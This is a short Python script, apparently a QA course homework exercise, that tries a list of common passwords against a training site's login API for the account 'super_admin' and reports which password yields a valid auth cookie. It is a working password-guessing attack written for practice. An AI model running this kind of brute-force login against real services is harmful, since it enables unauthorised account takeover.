import requests

splash_data = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111',
               '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely',
               '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']

url_get_secret_password_homework = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check_auth_cookie = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'


for password in splash_data:
    response = requests.post(url_get_secret_password_homework, data={'login': 'super_admin', 'password': password})
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post(url_check_auth_cookie, cookies=cookies)
    if response2.text != 'You are NOT authorized':
        print(response2.text)
        print(password)
